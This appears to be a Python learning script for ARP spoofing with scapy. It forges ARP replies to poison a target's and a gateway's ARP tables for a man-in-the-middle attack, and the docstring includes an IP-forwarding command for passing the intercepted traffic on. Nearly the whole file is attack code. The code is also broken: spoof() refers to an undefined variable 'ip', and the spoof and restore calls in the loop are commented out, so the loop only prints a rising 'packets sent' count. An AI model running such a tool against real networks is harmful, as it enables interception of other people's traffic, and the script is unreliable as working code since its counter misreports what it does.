#!/usr/bin/env python

"""
ARP Spoofer

Why ARP Spoofing is possible:
 - Clients accept responses even if they did not send a request
 - Clients trust response without any form of verification

# link IP to mac address
arp -a

# port forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
"""


import time
import scapy.all as scapy

# op = 2 (sent as ARP response, not request)
# pdst = IP of target machine
# hwdst = MAC address of target machine
# psrc = IP of router


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(
            arp_request_broadcast, timeout=1, verbose=False
            )[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(
        op=2, pdst=target_ip, hwdst=get_mac(ip), psrc=spoof_ip)
    print(packet.show())
    print(packet.summary())

    # send packet
    scapy.send(packet, verbose=False)


def restore(dest_ip, src_ip):
    packet = scapy.ARP(
            op=2,
            pdst=dest_ip,
            hwdst=get_mac(dest_ip),
            psrc=src_ip,
            hwsrc=get_mac(src_ip))
    scapy.send(packet, count=4, verbose=False)


target_ip = "10.0.2.7"
gateway_ip = "10.0.2.1"

try:
    sent_packets_count = 0
    while True:
        # spoof target
        # spoof(target_ip, gateway_ip)
        # spoof router
        # spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        # dynamic printing
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ..... Resetting ARP tables", end="")
    print("..... Please wait.\n")
    # restore(target_ip, gateway_ip)
    # restore(gateway_ip, target_ip)
